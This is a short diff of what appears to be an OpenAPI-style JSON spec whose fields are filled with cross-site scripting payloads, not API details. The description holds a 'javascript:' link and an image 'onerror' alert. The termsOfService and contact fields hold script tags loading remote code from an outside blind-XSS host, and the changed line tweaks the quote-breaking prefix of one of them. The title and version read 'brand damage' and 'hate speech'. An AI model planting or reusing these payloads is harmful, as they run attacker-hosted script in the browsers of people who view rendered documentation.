@@ -4,7 +4,7 @@
 "version": "hate speech",
 "title": "brand damage",
 "description": "[asd](javascript:alert(document.domain))xxxx<img src=x onerror=alert('XSS');>xxxx",
-"termsOfService": "'"><script src=//xss.report/s/Ma7moodBakr></script>,
+"termsOfService": "'"<script src=//xss.report/s/Ma7moodBakr></script>,
 "contact": {
 "name": "'"<script src=//xss.report/s/Ma7moodBakr></script>,
 "url": "'"<script src=//xss.report/s/Ma7moodBakr></script>,
